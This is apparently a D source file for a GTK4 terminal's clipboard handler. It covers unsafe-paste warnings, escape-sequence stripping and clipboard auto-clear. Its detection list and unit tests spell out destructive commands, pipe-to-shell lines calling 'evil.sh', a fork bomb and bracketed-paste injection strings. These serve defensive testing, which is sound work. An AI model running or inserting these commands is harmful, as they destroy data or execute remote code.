/*
 * This Source Code Form is subject to the terms of the Mozilla Public License, v. 2.0. If a copy of the MPL was not
 * distributed with this file, You can obtain one at http://mozilla.org/MPL/2.0/.
 */

/*
 * giD port of source/gx/ttyx/terminal/clipboard.d. Differences from GtkD:
 *   - `GdkAtom` (raw C alias from gdk.Atom) → the `gdk.atom.Atom` class; the
 *     selection constants in gx.gtk.clipboard are already typed `Atom` and
 *     `gtk.clipboard.Clipboard.get` takes one, so paste()/advancedPaste()
 *     now take `Atom` instead of `GdkAtom` (callers pass the same constants).
 *   - `gtkc.glib : g_source_remove` → `glib.source.Source.remove(tag)` wrapper.
 *   - `Clipboard.setText(text, len)` → `setText(text)` (giD takes a D string,
 *     no length parameter).
 *   - `SimpleXML.markupEscapeText(cmd, len)` → `glib.global.markupEscapeText(cmd)`.
 *   - UnsafePasteDialog: GtkD's MessageDialog(parent, flags, type, buttons,
 *     msg, null) ctor wraps non-introspectable varargs C and is not bound by
 *     giD. The subclass constructs the raw GObject with
 *     g_object_new(MessageDialog._getGType(), null) passed to super(ptr,
 *     No.Take) (the advpaste.d Dialog pattern); ButtonsType.None is the
 *     property default, `messageType`/modality/transient-for are set after
 *     construction. `new Image(name, size)` → `Image.newFromIconName`;
 *     `new Button(label)` → `Button.newWithLabel`; `getMessageArea()` returns
 *     a plain Widget in giD → cast to Box for the margin setters and add().
 *   - Enums are PascalCase in <pkg>.types: ResponseType.Apply,
 *     MessageType.Warning, IconSize.Dialog, Align.Start, ShadowType.EtchedIn,
 *     PolicyType.Automatic, pango.types.EllipsizeMode.End.
 */
module gx.ttyx.terminal.clipboard;

private:

import std.algorithm : count;
import std.array : join;
import std.experimental.logger;
import std.string : chomp, indexOf, splitLines, stripRight;

import gid.gid : No;

import gdk.clipboard : Clipboard;

import gio.async_result : AsyncResult;

import glib.global : markupEscapeText;
import glib.source : Source;

import gobject.c.functions : g_object_new;
import gobject.object : ObjectWrap;
import gobject.value : Value;

import gtk.box : Box;
import gtk.button : Button;
import gtk.dialog : Dialog;
import gtk.image : Image;
import gtk.label : Label;
import gtk.message_dialog : MessageDialog;
import gtk.scrolled_window : ScrolledWindow;
import gtk.types : Align, MessageType, PolicyType, ResponseType;
import gtk.window : Window;

import pango.types : EllipsizeMode;

import gx.gtk.clipboard : ClipboardSelection, selectionClipboard;
import gx.gtk.threads : threadsAddTimeoutDelegate;
import gx.i18n.l10n;

import gx.ttyx.constants : USE_COMMIT_SYNCHRONIZATION;
import gx.ttyx.preferences;
import gx.ttyx.terminal.advpaste;
import gx.ttyx.terminal.context;
import gx.ttyx.terminal.exvte : vtePasteText;
import gx.ttyx.terminal.types;

/// Module-level auto-clear state. Shared across all ClipboardHandler instances
/// because the GTK clipboard is a global resource.
uint _autoClearTimeoutID = 0;
string _lastCopiedText;

/**
 * Schedule auto-clear of the clipboard after the given timeout.
 * Cancels any existing pending auto-clear first.
 * Only clears if clipboard content still matches what was copied
 * (i.e., another application hasn't overwritten it).
 */
void scheduleAutoClear(Clipboard cb, string copiedText, uint timeoutSeconds) {
    cancelAutoClear();
    _lastCopiedText = copiedText;
    _autoClearTimeoutID = threadsAddTimeoutDelegate(
        timeoutSeconds * 1000,
        delegate() {
            _autoClearTimeoutID = 0;
            // GTK4: the clipboard is read asynchronously. The safeguard is
            // unchanged — only clear if the content is still exactly what we
            // copied, so another application's clipboard is never wiped.
            string expected = _lastCopiedText;
            _lastCopiedText = null;
            if (cb is null || expected is null) return false;
            cb.readTextAsync(null, delegate(ObjectWrap src, AsyncResult res) {
                string current;
                try {
                    current = cb.readTextFinish(res);
                } catch (Exception e) {
                    // Non-text or unreadable content is by definition not ours.
                    return;
                }
                if (current !is null && current == expected) {
                    // GDK4: a null content provider empties the clipboard.
                    cb.setContent(null);
                }
            });
            return false; // one-shot
        }
    );
}

/// Cancel any pending auto-clear timeout.
void cancelAutoClear() {
    if (_autoClearTimeoutID > 0) {
        Source.remove(_autoClearTimeoutID);
        _autoClearTimeoutID = 0;
    }
    _lastCopiedText = null;
}

package:

/**
 * True if `text` contains a line break that submits a command to the shell
 * on paste. Both LF ('\n') and CR ('\r') count: CR is what the Enter key
 * sends, so a "cmd\r" payload auto-executes exactly like "cmd\n". The
 * earlier checks tested only for LF, which let a CR-terminated payload slip
 * past both the unsafe-paste warning and the multi-line review dialog.
 */
bool containsLineBreak(string text) {
    return text.indexOf('\n') >= 0 || text.indexOf('\r') >= 0;
}

/**
 * Tests if the paste content is potentially unsafe.
 *
 * Currently checks for sudo combined with a newline, which would
 * execute a privileged command immediately on paste.
 */
bool isPasteUnsafe(string text) {
    import std.string : indexOf;
    import std.algorithm : any;

    // Must contain a line break to auto-execute
    if (!containsLineBreak(text)) return false;

    // Privilege escalation commands
    immutable string[] privilegePatterns = [
        "sudo", "su -", "doas", "pkexec"
    ];

    // Destructive or dangerous commands
    immutable string[] dangerousPatterns = [
        "rm -rf", "rm -fr",
        "mkfs", "dd if=",
        "chmod 777", "chmod -R 777",
        ":(){ :|:& };:", // fork bomb
    ];

    // Remote code execution patterns (pipe to shell)
    immutable string[] rcePatterns = [
        "| sh", "|sh",
        "| bash", "|bash",
    ];

    bool matchesAny(immutable string[] patterns) {
        return patterns.any!(p => text.indexOf(p) >= 0);
    }

    return matchesAny(privilegePatterns)
        || matchesAny(dangerousPatterns)
        || matchesAny(rcePatterns);
}

/**
 * Strip paste-relevant terminal escape sequences from clipboard content.
 *
 * Removes:
 *   - Bracketed paste markers (ESC[200~, ESC[201~) — used to break out
 *     of VTE's bracketed paste mode and inject commands.
 *   - OSC (Operating System Command, ESC]…BEL or ESC]…ESC\) — covers
 *     OSC 52, the clipboard-hijack vector that lets a remote source
 *     overwrite the system clipboard. VTE does not implement OSC 52
 *     today; this is defense-in-depth.
 *   - DCS (Device Control String, ESC P…ESC\), APC (ESC _…ESC\),
 *     PM (ESC ^…ESC\) — string-form sequences with no legitimate use
 *     in pasted text. Bundled with OSC because they share the shape
 *     and the same defense-in-depth argument applies.
 *
 * Unconditional sanitization — applied to every paste regardless of
 * settings. CSI color sequences (ESC[…m) are intentionally left alone:
 * they are the most common legitimate escape in clipboard text.
 *
 * Limitation: malformed sequences (introducer without a terminator)
 * are not stripped. They cannot trigger interpretation in a normal
 * terminal but can briefly cause input swallowing until a terminator
 * arrives. Out of scope for this pass; revisit if it becomes an issue.
 */
string stripPasteEscapes(string text) {
    import std.regex : ctRegex, replaceAll;
    // Bracketed paste markers.
    enum bracketedRe = ctRegex!`\x1b\[(200|201)~`;
    // OSC: terminated by BEL or ST (ESC\). Body excludes both so the
    // shortest well-formed sequence is matched.
    enum oscRe = ctRegex!`\x1b\][^\x07\x1b]*(\x07|\x1b\\)`;
    // DCS / APC / PM: introducer P, _, or ^; terminated by ST (ESC\).
    enum stStringRe = ctRegex!`\x1b[P_^][^\x1b]*\x1b\\`;

    // Apply every family repeatedly until the text reaches a fixed point.
    // A single replaceAll pass is non-overlapping and never re-scans its own
    // output, so removing one match can splice the surrounding bytes into a
    // freshly-formed marker — e.g. "\x1b[20" ++ "\x1b[201~" ++ "1~" becomes a
    // live "\x1b[201~" once the inner marker is removed. Each pass only
    // deletes, so the text strictly shortens whenever it changes and the loop
    // is guaranteed to terminate.
    string current = text;
    for (;;) {
        string next = current.replaceAll(bracketedRe, "");
        next = next.replaceAll(oscRe, "");
        next = next.replaceAll(stStringRe, "");
        if (next == current) {
            return current;
        }
        current = next;
    }
}

/**
 * Handles clipboard operations (copy, paste) for a terminal.
 *
 * Responsible for:
 * - Safe paste with multi-line and sudo detection
 * - Advanced paste dialog for reviewing content before pasting
 * - Copy with optional trailing whitespace stripping
 * - Synchronized input broadcasting on paste
 *
 * This is a candidate for security hardening (#27): paste protection
 * improvements, OSC 52 clipboard hijack prevention, clipboard auto-clear.
 */
class ClipboardHandler {

private:
    ITerminalContext _ctx;
    ISyncInputEmitter _sync;
    void delegate() _scrollToBottom;
    void delegate() _focusTerminal;

public:
    /**
     * Construct a ClipboardHandler.
     *
     * Params:
     *   ctx = Terminal context providing VTE, settings, and identity.
     *   sync = Emitter for broadcasting input to synchronized terminals.
     *   scrollToBottom = Callback to scroll the terminal to the bottom.
     *   focusTerminal = Callback to return keyboard focus to the terminal.
     */
    this(ITerminalContext ctx, ISyncInputEmitter sync,
         void delegate() scrollToBottom, void delegate() focusTerminal) {
        _ctx = ctx;
        _sync = sync;
        _scrollToBottom = scrollToBottom;
        _focusTerminal = focusTerminal;
    }

    private Clipboard clipboardFor(ClipboardSelection source) {
        return selectionClipboard(_ctx.contextVte(), source);
    }

    /**
     * Read `source` once, asynchronously, and hand the text to `then`.
     *
     * GTK4 clipboards have no synchronous read. Every paste path goes through
     * here so that a single read is the only read: everything downstream —
     * sanitising, the review or unsafe dialog, and the final send — operates on
     * this captured string. The clipboard is never consulted again for the same
     * paste, so what the user approves in a dialog is exactly what reaches the
     * shell, even if the clipboard changes while the dialog is open.
     */
    private void readClipboard(ClipboardSelection source, void delegate(string) then) {
        Clipboard cb = clipboardFor(source);
        if (cb is null) return;
        cb.readTextAsync(null, delegate(ObjectWrap src, AsyncResult res) {
            string text;
            try {
                text = cb.readTextFinish(res);
            } catch (Exception e) {
                trace("Clipboard has no readable text: " ~ e.msg);
                return;
            }
            if (text.length == 0) return;
            then(text);
        });
    }

    /**
     * Show the advanced paste dialog for reviewing multi-line content before
     * pasting. Single-line content takes the normal paste decision path — on the
     * text already read, not by re-reading the clipboard (the GTK3 version
     * called paste(source) here, which read the selection a second time).
     */
    void advancedPaste(ClipboardSelection source) {
        readClipboard(source, delegate(string raw) {
            string pasteText = stripPasteEscapes(raw);
            if (!containsLineBreak(pasteText)) {
                decidePaste(pasteText);
                return;
            }
            showReviewDialog(pasteText);
        });
    }

    /**
     * Copy terminal selection to clipboard, optionally stripping trailing
     * whitespace from each line.
     */
    void copyToClipboard() {
        _ctx.contextVte().copyClipboard();
        if (_ctx.contextGsSettings().getBoolean(SETTINGS_COPY_STRIP_TRAILING_WHITESPACE)) {
            Clipboard cb = clipboardFor(ClipboardSelection.clipboard);
            if (cb !is null) {
                cb.readTextAsync(null, delegate(ObjectWrap src, AsyncResult res) {
                    string text;
                    try { text = cb.readTextFinish(res); } catch (Exception) { return; }
                    if (text.length == 0) return;
                    string[] lines;
                    foreach (line; text.splitLines()) {
                        lines ~= line.stripRight();
                    }
                    string stripped = lines.join("\n");
                    if (stripped.length > 0) {
                        // GTK4: GdkClipboard has no setText; a GValue holding a
                        // string is the text content provider.
                        cb.set(new Value(stripped));
                    }
                    maybeScheduleAutoClear();
                });
                return;
            }
        }
        maybeScheduleAutoClear();
    }

    /**
     * Notify the auto-clear system that text was copied to the clipboard
     * outside of copyToClipboard() (e.g., hyperlink copy).
     */
    void notifyExternalCopy() {
        maybeScheduleAutoClear();
    }

    private void maybeScheduleAutoClear() {
        if (!_ctx.contextGsSettings().getBoolean(SETTINGS_CLIPBOARD_AUTO_CLEAR_KEY)) return;
        Clipboard cb = clipboardFor(ClipboardSelection.clipboard);
        if (cb is null) return;
        uint timeout = _ctx.contextGsSettings().getUint(SETTINGS_CLIPBOARD_AUTO_CLEAR_TIMEOUT_KEY);
        cb.readTextAsync(null, delegate(ObjectWrap src, AsyncResult res) {
            string text;
            try { text = cb.readTextFinish(res); } catch (Exception) { return; }
            if (text.length > 0) {
                scheduleAutoClear(cb, text, timeout);
            }
        });
    }

    /**
     * Paste from the given clipboard (primary or clipboard).
     *
     * Applies safety checks (multi-line review, unsafe paste warning), optional
     * whitespace stripping, and leading comment character removal. Broadcasts to
     * synchronized terminals if sync input is active.
     */
    void paste(ClipboardSelection source) {
        readClipboard(source, delegate(string raw) {
            string pasteText = stripPasteEscapes(raw);
            if (_ctx.contextGsSettings().getBoolean(SETTINGS_STRIP_TRAILING_WHITESPACE)) {
                pasteText = pasteText.stripRight();
            }
            if (pasteText.length == 0) return;
            decidePaste(pasteText);
        });
    }

    /**
     * The paste decision, on already-sanitised text: review dialog for
     * multi-line content, unsafe-paste dialog for dangerous single lines, else
     * commit straight away.
     */
    private void decidePaste(string pasteText) {
        // Multi-line paste: show review dialog (takes precedence over the unsafe
        // warning since the review dialog already flags unsafe content and lets
        // the user edit)
        if (containsLineBreak(pasteText) && _ctx.contextGsSettings().getBoolean(SETTINGS_WARN_MULTILINE_PASTE_KEY)) {
            showReviewDialog(pasteText);
            return;
        }
        // Single-line unsafe paste warning (multi-line is handled above)
        if (isPasteUnsafe(pasteText) && _ctx.contextGsSettings().getBoolean(SETTINGS_UNSAFE_PASTE_ALERT_KEY)) {
            showUnsafeDialog(pasteText);
            return;
        }
        commitPaste(pasteText);
    }

    /**
     * GTK4 dialogs have no run(): the response arrives on a signal after
     * present() returns. The text to paste is whatever the dialog ends up
     * showing — its own editable buffer — read inside the response handler.
     */
    private void showReviewDialog(string pasteText) {
        AdvancedPasteDialog dialog = new AdvancedPasteDialog(
            cast(Window) _ctx.toplevelWidget(), pasteText, isPasteUnsafe(pasteText));
        dialog.connectResponse(delegate void(int responseId, Dialog d) {
            if (responseId == ResponseType.Apply) {
                commitPaste(dialog.text);
            }
            dialog.destroy();
            _focusTerminal();
        });
        dialog.present();
    }

    private void showUnsafeDialog(string pasteText) {
        UnsafePasteDialog dialog = new UnsafePasteDialog(
            cast(Window) _ctx.toplevelWidget(), chomp(pasteText));
        dialog.connectResponse(delegate void(int responseId, Dialog d) {
            // Response 0 is "Paste Anyway"; anything else (1, or a dismissal
            // such as Escape / the close button) means do not paste. Dismissal
            // must default to the safe choice.
            if (responseId == 0) {
                commitPaste(pasteText);
            }
            dialog.destroy();
        });
        dialog.present();
    }

    /**
     * Send text to the terminal. The single place the paste actually happens,
     * so the strip-first-comment-char rule, the scroll-on-input rule and the
     * synchronized-input broadcast cannot drift apart across the three ways a
     * paste can be approved.
     */
    private void commitPaste(string pasteText) {
        auto vte = _ctx.contextVte();
        auto gsSettings = _ctx.contextGsSettings();

        if (gsSettings.getBoolean(SETTINGS_STRIP_FIRST_COMMENT_CHAR_ON_PASTE_KEY)
                && pasteText.length > 0 && (pasteText[0] == '#' || pasteText[0] == '$')) {
            pasteText = pasteText[1 .. $];
        }
        // Always paste the sanitized text through VTE's paste-text API rather
        // than pasteClipboard()/pastePrimary(), which would re-read the raw
        // selection from the OS and discard the sanitisation.
        // vte_terminal_paste_text still applies bracketed-paste wrapping, so
        // editors continue to receive properly-bracketed pastes.
        vtePasteText(vte, pasteText);

        if (_ctx.contextGsProfile().getBoolean(SETTINGS_PROFILE_SCROLL_ON_INPUT_KEY)) {
            _scrollToBottom();
        }
        static if (!USE_COMMIT_SYNCHRONIZATION) {
            if (_sync.isSynchronizedInput()) {
                SyncInputEvent se = SyncTextEvent(_ctx.terminalUUID(), pasteText);
                _sync.emitSyncInput(se);
            }
        }
    }
}

/**
 * Dialog shown when a paste operation contains potentially dangerous content
 * (e.g., sudo with a newline that would execute immediately).
 *
 * Copied from Pantheon Terminal and translated from Vala to D.
 * See: http://bazaar.launchpad.net/~elementary-apps/pantheon-terminal/trunk/view/head:/src/UnsafePasteDialog.vala
 */
class UnsafePasteDialog : MessageDialog {

public:
    this(Window parent, string cmd) {
        // GtkD's MessageDialog(parent, flags, type, buttons, msg, null) ctor
        // wraps varargs C that giD does not bind; construct the raw GObject
        // instead (ButtonsType.None is the property default) and set the
        // rest post-construction.
        super(cast(void*) g_object_new(MessageDialog._getGType(), cast(const(char)*) null), No.Take);
        messageType = MessageType.Warning;
        setModal(true);
        setTransientFor(parent);
        Box messageArea = cast(Box) getMessageArea();
        messageArea.setMarginStart(0);
        messageArea.setMarginEnd(0);
        string[3] msg = getUnsafePasteMessage();
        setMarkup("<span weight='bold' size='larger'>" ~ msg[0] ~ "</span>\n\n" ~ msg[1] ~ "\n" ~ msg[2] ~ "\n");

        Label lblCmd = new Label(markupEscapeText(cmd));
        lblCmd.setUseMarkup(true);
        lblCmd.setHalign(Align.Start);
        lblCmd.setEllipsize(EllipsizeMode.End);

        if (count(cmd, "\n") > 6) {
            ScrolledWindow sw = new ScrolledWindow();
            sw.setHasFrame(true);
            sw.setPolicy(PolicyType.Automatic, PolicyType.Automatic);
            sw.setHexpand(true);
            sw.setVexpand(true);
            sw.setSizeRequest(400, 140);
            sw.setChild(lblCmd);
            messageArea.append(sw);
        } else {
            messageArea.append(lblCmd);
        }

        Button btnCancel = Button.newWithLabel(_("Don't Paste"));
        Button btnIgnore = Button.newWithLabel(_("Paste Anyway"));
        btnIgnore.getStyleContext().addClass("destructive-action");
        addActionWidget(btnCancel, 1);
        addActionWidget(btnIgnore, 0);
        // GTK4: widgets are visible by default; no showAll().
        btnIgnore.grabFocus();
    }
}

// ---------------------------------------------------------------------------
// Unit tests for isPasteUnsafe
// ---------------------------------------------------------------------------

/// Test: no newline is always safe (won't auto-execute).
unittest {
    assert(!isPasteUnsafe("sudo rm -rf /"));
    assert(!isPasteUnsafe("curl | bash"));
    assert(!isPasteUnsafe("dd if=/dev/zero"));
}

/// Test: empty string and bare newline are safe.
unittest {
    assert(!isPasteUnsafe(""));
    assert(!isPasteUnsafe("\n"));
}

/// Test: harmless multi-line is safe.
unittest {
    assert(!isPasteUnsafe("echo hello\necho world\n"));
    assert(!isPasteUnsafe("ls -la\npwd\n"));
}

/// Test: privilege escalation patterns.
unittest {
    assert(isPasteUnsafe("sudo rm -rf /\n"));
    assert(isPasteUnsafe("sudo\n"));
    assert(isPasteUnsafe("su - root\n"));
    assert(isPasteUnsafe("doas reboot\n"));
    assert(isPasteUnsafe("pkexec bash\n"));
}

/// Test: destructive command patterns.
unittest {
    assert(isPasteUnsafe("rm -rf /home\n"));
    assert(isPasteUnsafe("rm -fr /tmp/*\n"));
    assert(isPasteUnsafe("mkfs.ext4 /dev/sda1\n"));
    assert(isPasteUnsafe("dd if=/dev/zero of=/dev/sda\n"));
    assert(isPasteUnsafe("chmod 777 /etc/passwd\n"));
}

/// Test: remote code execution patterns.
unittest {
    assert(isPasteUnsafe("curl https://evil.sh | bash\n"));
    assert(isPasteUnsafe("wget https://evil.sh | sh\n"));
    assert(isPasteUnsafe("curl https://evil.sh|bash\n"));
}

/// Test: fork bomb.
unittest {
    assert(isPasteUnsafe(":(){ :|:& };:\n"));
}

/// Test: "sudo" as substring is flagged (known limitation).
unittest {
    assert(isPasteUnsafe("visudo /etc/sudoers\n"));
}

/// Test: dangerous command buried in multi-line.
unittest {
    assert(isPasteUnsafe("echo hello\nsudo apt install malware\necho done"));
    assert(isPasteUnsafe("echo setup\ncurl https://x.sh | bash\necho done\n"));
}

// ---------------------------------------------------------------------------
// Unit tests for containsLineBreak
// ---------------------------------------------------------------------------

/// Test: both LF and CR (and CRLF) count as line breaks; plain text does not.
unittest {
    assert(containsLineBreak("cmd\n"));
    assert(containsLineBreak("cmd\r"));
    assert(containsLineBreak("cmd\r\n"));
    assert(containsLineBreak("a\rb"));
    assert(!containsLineBreak("cmd"));
    assert(!containsLineBreak(""));
}

/// Test: CR-terminated dangerous commands are flagged. Previously they
/// evaded detection because only LF was checked, yet CR auto-executes.
unittest {
    assert(isPasteUnsafe("sudo rm -rf /\r"));
    assert(isPasteUnsafe("curl https://evil.sh | bash\r"));
    assert(isPasteUnsafe("echo ok\rsudo reboot\r"));
}

// ---------------------------------------------------------------------------
// Unit tests for stripPasteEscapes
// ---------------------------------------------------------------------------

/// Test: strips ESC[200~ (start bracketed paste).
unittest {
    assert(stripPasteEscapes("\x1b[200~hello") == "hello");
}

/// Test: strips ESC[201~ (end bracketed paste).
unittest {
    assert(stripPasteEscapes("hello\x1b[201~") == "hello");
}

/// Test: strips both start and end sequences.
unittest {
    assert(stripPasteEscapes("\x1b[200~hello\x1b[201~") == "hello");
}

/// Test: strips injected end-bracketed-paste attack payload.
unittest {
    string attack = "echo harmless\x1b[201~\nrm -rf ~/Documents\n";
    string sanitized = stripPasteEscapes(attack);
    assert(sanitized.indexOf("\x1b[201~") < 0, "attack sequence must be removed");
    assert(sanitized == "echo harmless\nrm -rf ~/Documents\n");
}

/// Test: preserves normal text without escape sequences.
unittest {
    assert(stripPasteEscapes("normal text\nwith newlines") == "normal text\nwith newlines");
}

/// Test: handles empty string.
unittest {
    assert(stripPasteEscapes("") == "");
}

/// Test: handles text that is only escape sequences.
unittest {
    assert(stripPasteEscapes("\x1b[200~\x1b[201~") == "");
}

/// Test: handles multiple occurrences.
unittest {
    assert(stripPasteEscapes("\x1b[200~a\x1b[201~b\x1b[200~c\x1b[201~") == "abc");
}

/// Test: preserves CSI sequences (color codes etc.) — only string-form
/// escape families and bracketed-paste markers are stripped.
unittest {
    assert(stripPasteEscapes("\x1b[0mhello") == "\x1b[0mhello");
    assert(stripPasteEscapes("\x1b[1;31mred\x1b[0m") == "\x1b[1;31mred\x1b[0m");
}

/// Test: strips OSC 52 clipboard-hijack with BEL terminator.
unittest {
    string attack = "before\x1b]52;c;aGVsbG8=\x07after";
    assert(stripPasteEscapes(attack) == "beforeafter");
}

/// Test: strips OSC 52 clipboard-hijack with ST (ESC\) terminator.
unittest {
    string attack = "before\x1b]52;c;aGVsbG8=\x1b\\after";
    assert(stripPasteEscapes(attack) == "beforeafter");
}

/// Test: strips OSC sequences other than 52 (e.g. window title).
unittest {
    assert(stripPasteEscapes("\x1b]0;evil-title\x07hello") == "hello");
}

/// Test: strips DCS sequences (ESC P ... ESC\).
unittest {
    assert(stripPasteEscapes("a\x1bPq#payload\x1b\\b") == "ab");
}

/// Test: strips APC sequences (ESC _ ... ESC\) — Kitty graphics shape.
unittest {
    assert(stripPasteEscapes("a\x1b_Gpayload\x1b\\b") == "ab");
}

/// Test: strips PM sequences (ESC ^ ... ESC\).
unittest {
    assert(stripPasteEscapes("a\x1b^msg\x1b\\b") == "ab");
}

/// Test: multiple escape families in one paste are all stripped.
unittest {
    string mixed = "\x1b[200~"                  // bracketed paste start
                 ~ "echo hello\n"
                 ~ "\x1b]52;c;cGF5bG9hZA==\x07"  // OSC 52
                 ~ "echo world\n"
                 ~ "\x1b_GAA\x1b\\"              // APC
                 ~ "\x1b[201~";                  // bracketed paste end
    assert(stripPasteEscapes(mixed) == "echo hello\necho world\n");
}

/// Test: malformed (unterminated) string-form sequences are NOT stripped.
/// Documented limitation — these can't trigger interpretation but may
/// briefly cause input swallowing. Out of scope for this pass.
unittest {
    // Lone OSC introducer — passes through untouched.
    assert(stripPasteEscapes("\x1b]hello") == "\x1b]hello");
}

/// Test: split bracketed-paste markers that reassemble after one removal
/// are stripped by the fixed-point loop. A single-pass replaceAll removed
/// the inner "\x1b[201~" and spliced "\x1b[20" + "1~" into a fresh, intact
/// "\x1b[201~" that survived and terminated bracketed-paste mode early.
unittest {
    string attack = "\x1b[20\x1b[201~1~rm -rf ~";
    string sanitized = stripPasteEscapes(attack);
    assert(sanitized.indexOf("\x1b[201~") < 0, "reassembled end marker must be removed");
    assert(sanitized == "rm -rf ~");
}

/// Test: the start marker reassembles the same way and is also stripped.
unittest {
    string attack = "\x1b[20\x1b[200~0~payload";
    string sanitized = stripPasteEscapes(attack);
    assert(sanitized.indexOf("\x1b[200~") < 0);
    assert(sanitized == "payload");
}

/// Test: cross-family reassembly — removing an OSC sequence between two
/// fragments splices "\x1b[20" + "1~" into a live "\x1b[201~", which the
/// loop must then strip on the following pass.
unittest {
    string attack = "\x1b[20\x1b]x\x071~payload";
    string sanitized = stripPasteEscapes(attack);
    assert(sanitized.indexOf("\x1b[201~") < 0, "reassembled marker after OSC removal must be removed");
    assert(sanitized == "payload");
}

// ---------------------------------------------------------------------------
// Unit tests for clipboard auto-clear
// ---------------------------------------------------------------------------

/// Test: cancelAutoClear is safe to call with no active timeout.
unittest {
    cancelAutoClear();
    assert(_autoClearTimeoutID == 0);
    assert(_lastCopiedText is null);
}

/// Test: cancelAutoClear is idempotent (safe to call multiple times).
unittest {
    cancelAutoClear();
    cancelAutoClear();
    cancelAutoClear();
    assert(_autoClearTimeoutID == 0);
}
